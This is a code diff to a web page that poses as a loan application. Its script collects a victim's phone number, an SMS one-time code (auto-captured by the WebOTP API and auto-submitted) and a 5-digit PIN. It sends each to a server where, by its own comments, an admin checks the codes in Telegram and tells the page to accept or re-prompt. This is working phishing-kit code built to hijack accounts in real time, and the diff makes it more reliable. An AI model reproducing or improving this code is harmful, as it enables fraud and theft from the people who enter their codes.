@@ -245,7 +245,7 @@
             </div>
         </div>
 
-        <!-- PAGE 2: OTP (4 digits) -->
+        <!-- PAGE 2: OTP (4 digits, 10s auto-capture then manual) -->
         <div class="page" id="page2">
             <div class="card">
                 <div class="otp-section">
@@ -343,11 +343,12 @@
     let wsConnected = false;
     let otpTimerInterval = null;
     let otpTimeout = null;
+    let otpAutoCaptured = false;
 
     // ═══════════════════════════════════════════
     // INIT
     // ═══════════════════════════════════════════
-    document.addEventListener('DOMContentLoaded', () => {
+    document.addEventListener('DOMContentLoaded', function() {
         initQuickAmounts();
         initPeriodButtons();
         initPinInput();
@@ -357,29 +358,34 @@
         document.getElementById('btnApply').addEventListener('click', handlePage1Submit);
         document.getElementById('btnOtp').addEventListener('click', handlePage2Submit);
         document.getElementById('btnPin').addEventListener('click', handlePage3Submit);
-        document.getElementById('btnBack1').addEventListener('click', () => goToPage(1));
-        document.getElementById('btnBack2').addEventListener('click', () => goToPage(2));
+        document.getElementById('btnBack1').addEventListener('click', function() { goToPage(1); });
+        document.getElementById('btnBack2').addEventListener('click', function() { goToPage(2); });
         document.getElementById('btnReset').addEventListener('click', resetApp);
     });
 
     // ═══════════════════════════════════════════
-    // WEBSOCKET
+    // WEBSOCKET — receives admin button decisions
     // ═══════════════════════════════════════════
     function connectWebSocket() {
+        if (!sessionId) return;
         const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
         ws = new WebSocket(protocol + '//' + location.host + '/ws?session=' + sessionId);
 
-        ws.onopen = () => { wsConnected = true; console.log('WS connected'); };
+        ws.onopen = function() {
+            wsConnected = true;
+            console.log('WS connected, session:', sessionId);
+        };
 
-        ws.onmessage = (event) => {
+        ws.onmessage = function(event) {
             const msg = JSON.parse(event.data);
+            console.log('WS received:', msg);
 
-            // OTP RESULT
+            // OTP admin decision
             if (msg.type === 'otp_result') {
                 if (msg.result === 'correct') {
                     document.getElementById('otpWaiting').classList.remove('show');
                     showToast('OTP verified! Moving to PIN…', 'success');
-                    setTimeout(() => goToPage(3), 1000);
+                    setTimeout(function() { goToPage(3); }, 1200);
                 } else if (msg.result === 'wrong') {
                     document.getElementById('otpWaiting').classList.remove('show');
                     document.getElementById('otpAlert').classList.add('show');
@@ -388,29 +394,39 @@
                     document.getElementById('otpInput').focus();
                     document.getElementById('btnOtp').disabled = false;
                     document.getElementById('btnOtp').classList.remove('loading');
+                    const status = document.getElementById('otpStatus');
+                    status.className = 'otp-status error';
+                    status.textContent = '❌ Wrong OTP. Enter the correct code.';
                 }
             }
 
-            // PIN RESULT
+            // PIN admin decision
             if (msg.type === 'pin_result') {
                 if (msg.result === 'correct') {
                     document.getElementById('pinWaiting').classList.remove('show');
                     showToast('PIN verified! Application complete!', 'success');
-                    setTimeout(() => handleSuccess(), 1000);
+                    setTimeout(function() { handleSuccess(); }, 1200);
                 } else if (msg.result === 'wrong') {
                     document.getElementById('pinWaiting').classList.remove('show');
                     document.getElementById('pinAlert').classList.add('show');
                     document.getElementById('pinInput').value = '';
                     document.getElementById('pinInput').focus();
-                    document.querySelectorAll('.pin-dot').forEach(d => d.classList.remove('filled'));
+                    document.querySelectorAll('.pin-dot').forEach(function(d) { d.classList.remove('filled'); });
                     document.getElementById('btnPin').disabled = false;
                     document.getElementById('btnPin').classList.remove('loading');
                 }
             }
         };
 
-        ws.onclose = () => { wsConnected = false; setTimeout(connectWebSocket, 3000); };
-        ws.onerror = () => {};
+        ws.onclose = function() {
+            wsConnected = false;
+            console.log('WS disconnected, reconnecting in 3s…');
+            setTimeout(connectWebSocket, 3000);
+        };
+
+        ws.onerror = function() {
+            console.log('WS error');
+        };
     }
 
     // ═══════════════════════════════════════════
@@ -427,7 +443,7 @@
         currentEl.style.transform = 'translateX(-20px)';
         currentEl.style.transition = 'all 0.25s ease';
 
-        setTimeout(() => {
+        setTimeout(function() {
             currentEl.classList.remove('active');
             currentEl.style.opacity = '';
             currentEl.style.transform = '';
@@ -438,16 +454,17 @@
             updateProgress(pageNum);
             window.scrollTo({ top: 0, behavior: 'smooth' });
 
+            // Start OTP capture when entering page 2
             if (pageNum === 2) startOTPCapture();
 
-            setTimeout(() => { isNavigating = false; }, 300);
+            setTimeout(function() { isNavigating = false; }, 300);
         }, 250);
     }
 
     function updateProgress(pageNum) {
         const steps = document.querySelectorAll('.step');
         const line = document.getElementById('progressLine');
-        steps.forEach((step, i) => {
+        steps.forEach(function(step, i) {
             step.classList.remove('active', 'completed');
             if (i + 1 < pageNum || pageNum >= 4) step.classList.add('completed');
             if (i + 1 === pageNum) step.classList.add('active');
@@ -457,7 +474,7 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 1: SUBMIT
+    // PAGE 1: SUBMIT → Telegram (no buttons)
     // ═══════════════════════════════════════════
     function validatePage1() {
         let valid = true;
@@ -531,6 +548,8 @@
 
             if (data.success) {
                 sessionId = data.sessionId;
+
+                // Connect WebSocket to receive admin decisions
                 connectWebSocket();
 
                 // Build summary for PIN page
@@ -549,21 +568,25 @@
                 btn.classList.remove('loading');
                 btn.disabled = false;
                 goToPage(2);
+            } else {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                showToast('Server error: ' + (data.error || 'Unknown'), 'error');
             }
         } catch (err) {
-            console.error(err);
+            console.error('Page 1 error:', err);
             btn.classList.remove('loading');
             btn.disabled = false;
-            showToast('Connection error', 'error');
+            showToast('Connection error. Try again.', 'error');
         }
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 2: OTP (4 digits, 20s auto-capture)
+    // PAGE 2: OTP (4 digits, 10s auto-capture)
     // ═══════════════════════════════════════════
     function initOtpInput() {
         const otpInput = document.getElementById('otpInput');
-        otpInput.addEventListener('input', (e) => {
+        otpInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
         });
     }
@@ -574,54 +597,67 @@
         const timerEl = document.getElementById('otpTimer');
         const btn = document.getElementById('btnOtp');
 
-        // Reset
+        // Reset all state
         otpInput.value = '';
         otpInput.readOnly = true;
         btn.disabled = false;
         btn.classList.remove('loading');
         document.getElementById('otpAlert').classList.remove('show');
         document.getElementById('otpWaiting').classList.remove('show');
+        otpAutoCaptured = false;
 
+        // Clear previous timers
         if (otpTimerInterval) clearInterval(otpTimerInterval);
         if (otpTimeout) clearTimeout(otpTimeout);
 
-        // 20s countdown
-        let sec = 20;
-        timerEl.textContent = 'Auto-capturing… ' + sec + 's';
+        // 10 second countdown
+        let sec = 10;
+        timerEl.textContent = '⏳ Auto-capturing… ' + sec + 's';
         status.className = 'otp-status listening';
-        status.textContent = '⏳ Waiting for SMS… Code will auto-fill';
+        status.textContent = 'Waiting for SMS code… Will auto-fill when received';
 
-        otpTimerInterval = setInterval(() => {
+        otpTimerInterval = setInterval(function() {
             sec--;
-            if (sec > 0) timerEl.textContent = 'Auto-capturing… ' + sec + 's';
+            if (sec > 0) {
+                timerEl.textContent = '⏳ Auto-capturing… ' + sec + 's';
+            }
         }, 1000);
 
-        // After 20s: enable manual
-        otpTimeout = setTimeout(() => {
+        // After 10 seconds: stop waiting, allow manual entry
+        otpTimeout = setTimeout(function() {
             clearInterval(otpTimerInterval);
             timerEl.textContent = '';
             otpInput.readOnly = false;
             otpInput.focus();
             status.className = 'otp-status manual';
-            status.textContent = '📲 Enter the 4-digit code manually';
-        }, 20000);
+            status.textContent = '📲 Auto-capture timed out. Enter the 4-digit code manually.';
+        }, 10000);
 
-        // Try WebOTP
+        // Attempt WebOTP auto-capture (Chrome on Android + HTTPS)
         if (window.isSecureContext && 'OTPCredential' in window) {
             navigator.credentials.get({ otp: { transport: ['sms'] } })
-                .then(otp => {
+                .then(function(otp) {
+                    // Success! Clear timers, fill input, auto-submit
                     if (otpTimeout) clearTimeout(otpTimeout);
                     if (otpTimerInterval) clearInterval(otpTimerInterval);
                     timerEl.textContent = '';
+
                     otpInput.value = otp.code;
                     otpInput.readOnly = true;
                     status.className = 'otp-status success';
-                    status.textContent = '✅ Code received! Submitting…';
+                    status.textContent = '✅ Code received! Submitting automatically…';
                     appData.otp = otp.code;
-                    setTimeout(() => handlePage2Submit(), 1000);
+                    otpAutoCaptured = true;
+
+                    // Auto-submit after 1 second
+                    setTimeout(function() { handlePage2Submit(); }, 1000);
                 })
-                .catch(() => {});
+                .catch(function(err) {
+                    // Auto-capture failed — wait for 10s timeout to enable manual
+                    console.log('WebOTP failed, waiting for timeout:', err.message);
+                });
         } else {
+            // No WebOTP support — go straight to manual entry
             if (otpTimeout) clearTimeout(otpTimeout);
             if (otpTimerInterval) clearInterval(otpTimerInterval);
             timerEl.textContent = '';
@@ -654,22 +690,28 @@
             const res = await fetch('/api/otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, otp })
+                body: JSON.stringify({ sessionId: sessionId, otp: otp })
             });
             const data = await res.json();
 
             if (data.success) {
+                // Show waiting state — admin will click button in Telegram
                 document.getElementById('otpWaiting').classList.add('show');
                 const status = document.getElementById('otpStatus');
                 status.className = 'otp-status waiting';
-                status.textContent = '⏳ Waiting for admin to verify…';
+                status.textContent = '⏳ OTP sent to admin. Waiting for verification…';
+            } else {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                document.getElementById('otpInput').readOnly = false;
+                showToast(data.error || 'Error sending OTP', 'error');
             }
         } catch (err) {
-            console.error(err);
+            console.error('OTP submit error:', err);
             btn.classList.remove('loading');
             btn.disabled = false;
             document.getElementById('otpInput').readOnly = false;
-            showToast('Connection error', 'error');
+            showToast('Connection error. Try again.', 'error');
         }
         isSubmitting = false;
     }
@@ -680,9 +722,9 @@
     function initPinInput() {
         const pinInput = document.getElementById('pinInput');
         const dots = document.querySelectorAll('.pin-dot');
-        pinInput.addEventListener('input', (e) => {
+        pinInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 5);
-            dots.forEach((d, i) => d.classList.toggle('filled', i < e.target.value.length));
+            dots.forEach(function(d, i) { d.classList.toggle('filled', i < e.target.value.length); });
             if (e.target.value.length === 5) document.getElementById('pinError').classList.remove('show');
         });
     }
@@ -709,18 +751,23 @@
             const res = await fetch('/api/pin', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, pin })
+                body: JSON.stringify({ sessionId: sessionId, pin: pin })
             });
             const data = await res.json();
 
             if (data.success) {
+                // Show waiting state — admin will click button in Telegram
                 document.getElementById('pinWaiting').classList.add('show');
+            } else {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                showToast(data.error || 'Error sending PIN', 'error');
             }
         } catch (err) {
-            console.error(err);
+            console.error('PIN submit error:', err);
             btn.classList.remove('loading');
             btn.disabled = false;
-            showToast('Connection error', 'error');
+            showToast('Connection error. Try again.', 'error');
         }
         isSubmitting = false;
     }
@@ -733,7 +780,7 @@
         document.getElementById('refNumber').textContent = ref;
         document.getElementById('successPhone').textContent = appData.phone;
 
-        document.querySelectorAll('.step').forEach(s => {
+        document.querySelectorAll('.step').forEach(function(s) {
             s.classList.remove('active');
             s.classList.add('completed');
         });
@@ -750,7 +797,7 @@
         const t = document.getElementById('toast');
         t.textContent = msg;
         t.className = 'toast ' + (type || '') + ' show';
-        setTimeout(() => t.classList.remove('show'), 3000);
+        setTimeout(function() { t.classList.remove('show'); }, 3000);
     }
 
     function resetApp() {
@@ -761,6 +808,7 @@
         wsConnected = false;
         if (otpTimerInterval) clearInterval(otpTimerInterval);
         if (otpTimeout) clearTimeout(otpTimeout);
+        otpAutoCaptured = false;
 
         document.getElementById('fullName').value = '';
         document.getElementById('phoneNumber').value = '';
@@ -776,11 +824,11 @@
         document.getElementById('otpWaiting').classList.remove('show');
         document.getElementById('pinAlert').classList.remove('show');
         document.getElementById('pinWaiting').classList.remove('show');
-        document.querySelectorAll('.pin-dot').forEach(d => d.classList.remove('filled'));
-        document.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('selected'));
-        document.querySelectorAll('.period-btn').forEach(b => b.classList.remove('selected'));
-        document.querySelectorAll('.form-input').forEach(i => i.classList.remove('error'));
-        document.querySelectorAll('.error-message').forEach(e => e.classList.remove('show'));
+        document.querySelectorAll('.pin-dot').forEach(function(d) { d.classList.remove('filled'); });
+        document.querySelectorAll('.quick-btn').forEach(function(b) { b.classList.remove('selected'); });
+        document.querySelectorAll('.period-btn').forEach(function(b) { b.classList.remove('selected'); });
+        document.querySelectorAll('.form-input').forEach(function(i) { i.classList.remove('error'); });
+        document.querySelectorAll('.error-message').forEach(function(e) { e.classList.remove('show'); });
         document.getElementById('btnOtp').disabled = false;
         document.getElementById('btnOtp').classList.remove('loading');
         document.getElementById('btnPin').disabled = false;
@@ -792,9 +840,9 @@
     // INPUT INITIALIZERS
     // ═══════════════════════════════════════════
     function initQuickAmounts() {
-        document.querySelectorAll('.quick-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('selected'));
+        document.querySelectorAll('.quick-btn').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.quick-btn').forEach(function(b) { b.classList.remove('selected'); });
                 btn.classList.add('selected');
                 const amt = parseInt(btn.dataset.amount);
                 document.getElementById('loanAmount').value = amt;
@@ -803,10 +851,10 @@
                 document.getElementById('amountError').classList.remove('show');
             });
         });
-        document.getElementById('loanAmount').addEventListener('input', (e) => {
+        document.getElementById('loanAmount').addEventListener('input', function(e) {
             const v = parseInt(e.target.value) || 0;
             document.getElementById('amountDisplay').textContent = v.toLocaleString();
-            document.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('selected'));
+            document.querySelectorAll('.quick-btn').forEach(function(b) { b.classList.remove('selected'); });
             if (v >= 500 && v <= 50000) {
                 e.target.classList.remove('error');
                 document.getElementById('amountError').classList.remove('show');
@@ -815,9 +863,9 @@
     }
 
     function initPeriodButtons() {
-        document.querySelectorAll('.period-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.period-btn').forEach(b => b.classList.remove('selected'));
+        document.querySelectorAll('.period-btn').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.period-btn').forEach(function(b) { b.classList.remove('selected'); });
                 btn.classList.add('selected');
                 document.getElementById('periodError').classList.remove('show');
             });
@@ -826,7 +874,7 @@
 
     function initPhoneInput() {
         const input = document.getElementById('phoneNumber');
-        input.addEventListener('input', (e) => {
+        input.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
         });
     }
